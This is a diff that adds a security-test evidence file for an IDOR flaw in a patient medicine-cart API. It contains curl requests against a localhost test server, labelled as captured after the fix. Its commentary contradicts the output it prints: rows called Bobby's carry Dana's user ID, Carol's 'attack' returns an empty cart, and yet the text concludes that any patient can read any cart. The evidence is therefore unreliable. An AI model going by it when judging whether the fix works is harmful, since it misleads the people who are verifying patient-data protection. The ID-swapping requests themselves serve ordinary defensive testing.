@@ -1,0 +1,67 @@
+V-13 IDOR: one patient can read another patient's cart
+======================================================
+
+state    : AFTER the fix
+captured : 2026-09-27T06:25:48Z
+branch   : fix/it22083500/v13-cart-idor
+commit   : 34bc5fa
+tool     : curl 8.15.0  (real curl, output unedited)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+Variables used below (values come from security-tests/.tokens.json):
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab8b6e80c259e6d5cd05d67
+  CAROL=patientToken=<carol's JWT>  CAROL_ID=6ab8b6e80c259e6d5cd05d65
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab8b6e80c259e6d5cd05d63
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab8b6e80c259e6d5cd05d6b   (Dr Beta's id: 6ab8b6e80c259e6d5cd05d6e)
+  MED1=6ab8b6e80c259e6d5cd05d71  MED_NEG=8e858e5ee442879cd0b5585a  MED2=1b84402f8c3c4358f2d630d8  MED4=163b7b40441718ea5caf79b2
+  CART_ID=6ab8b6e80c259e6d5cd05f66  APPT_ID=6ab8b6e80c259e6d5cd05f68
+
+------------------------------------------------------------------------------
+CONTROL — Dana reads her own cart (this must always work)
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$DANA_ID" -H "Cookie: $DANA"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 558
+ETag: W/"22e-ujvdf+Bt/ZxLdY39t9wkORMj4qQ"
+Date: Sun, 27 Sep 2026 06:25:49 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[{"_id":"6ab8b6ec0c259e6d5cd05f6d","userId":"6ab8b6e80c259e6d5cd05d67","medicineId":"6ab8b6e80c259e6d5cd05d71","quantity":99,"totalPrice":1,"status":"Pending","createdAt":"2026-09-27T06:25:48.733Z","updatedAt":"2026-09-27T06:25:48.733Z","__v":0},{"_id":"6ab8b6ec0c259e6d5cd05f71","userId":"6ab8b6e80c259e6d5cd05d67","medicineId":"8e858e5ee442879cd0b5585a","quantity":2,"totalPrice":-500,"status":"Pending","createdAt":"2026-09-27T06:25:48.817Z","updatedAt":"2026-09-27T06:25:48.817Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+ATTACK 1 — Dana, with her own cookie, asks for Bobby's cart
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $DANA"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 558
+ETag: W/"22e-ujvdf+Bt/ZxLdY39t9wkORMj4qQ"
+Date: Sun, 27 Sep 2026 06:25:49 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[{"_id":"6ab8b6ec0c259e6d5cd05f6d","userId":"6ab8b6e80c259e6d5cd05d67","medicineId":"6ab8b6e80c259e6d5cd05d71","quantity":99,"totalPrice":1,"status":"Pending","createdAt":"2026-09-27T06:25:48.733Z","updatedAt":"2026-09-27T06:25:48.733Z","__v":0},{"_id":"6ab8b6ec0c259e6d5cd05f71","userId":"6ab8b6e80c259e6d5cd05d67","medicineId":"8e858e5ee442879cd0b5585a","quantity":2,"totalPrice":-500,"status":"Pending","createdAt":"2026-09-27T06:25:48.817Z","updatedAt":"2026-09-27T06:25:48.817Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+Every row returned has "userId":"6ab8b6e80c259e6d5cd05d63" — Bobby's data, sent to Dana.
+
+ATTACK 2 — a second, unrelated patient (Carol) does exactly the same
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $CAROL"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 67
+ETag: W/"43-nIXujmvUwPcF/dVOpws8X2ZyzHE"
+Date: Sun, 27 Sep 2026 06:25:49 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[],"message":"Cart Fetched Successfully!"}
+
+Carol also receives Bobby's cart — ANY logged-in patient can read ANY cart.
